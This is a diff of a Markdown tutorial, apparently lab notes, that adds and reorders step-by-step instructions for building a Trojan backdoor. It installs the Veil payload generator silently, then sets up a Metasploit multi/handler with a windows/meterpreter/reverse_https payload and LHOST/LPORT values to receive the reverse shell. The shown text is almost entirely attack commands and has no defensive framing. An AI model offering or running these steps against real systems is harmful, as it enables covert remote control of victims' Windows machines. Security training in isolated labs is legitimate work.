@@ -11,7 +11,15 @@
 
 # Introduction
 
-# An example
+# Creating the backdoor
+
+First install veil, but really this way, as the installation of veil will 
+install tons of other stuff which will popup wizards etc and you will fail 
+at some point anyway:
+
+    apt update
+    apt install -y veil
+    /usr/share/veil/config/setup.sh --force --silent
 
 Start veil as root user.
 
@@ -55,9 +63,23 @@ You get some information to where the output is generated. Which is:
 
     /var/lib/veil/output/compiled/
 
-So now, in a console start the Metasploit Framework with `msfconsole`.
+# Using the backdoor
+
+Start the metasploit console with:
+
+    msfconsole
+
+Nos use a multi handler listener:
 
     use exploit/multi/handler
+
+We need to select the same payload as we used to create the Trojan backdoor. 
+But we can list all available payloads with `show payloads`. Which will 
+return a list of `549` entries.
+
+Set the payload:
+
+    set PAYLOAD windows/meterpreter/reverse_https
 
 See the available options we can/need to set
 
@@ -67,14 +89,6 @@ Set the required options
 
     set LHOST 10.0.2.4
     set LPORT 8080
-
-We need to select the same payload as we used to create the Trojan backdoor. 
-But we can list all available payloads with `show payloads`. Which will 
-return a list of `549` entries.
-
-Set the payload:
-
-    set PAYLOAD windows/meterpreter/reverse_https
 
 Verify the options now and if needed, adjust them like we did before:
 
